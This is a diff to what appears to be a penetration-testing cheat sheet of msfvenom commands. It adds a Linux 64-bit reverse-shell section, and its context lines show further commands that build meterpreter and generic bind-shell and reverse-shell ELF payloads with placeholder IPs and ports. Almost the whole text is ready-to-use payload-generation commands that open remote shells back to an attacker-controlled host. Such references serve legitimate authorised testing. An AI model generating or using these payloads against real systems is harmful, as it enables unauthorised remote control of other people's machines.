@@ -22,6 +22,13 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Lo
 ```
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > FILENAME.elf
 ```
+
+### Linux 64-bit Reverse Shell
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > FILENAME.elf
+```
+***Change to x86 for 32-bit***
+
 ### Linux Bind Shell
 ```
 msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > FILENAME.elf
